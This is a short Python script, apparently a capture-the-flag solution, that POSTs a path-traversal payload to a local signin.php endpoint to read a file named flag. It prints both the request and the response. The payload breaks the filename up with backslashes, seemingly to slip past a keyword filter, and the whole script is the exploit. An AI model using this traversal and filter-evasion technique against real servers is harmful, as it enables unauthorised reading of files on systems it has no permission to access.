#!/usr/bin/python3

import requests

url = "http://localhost:8080/signin.php?time=time"
data = '../../../f\l\\a\g'

x = requests.post(url, str(data))
print(x.request.body)
print(x.text)
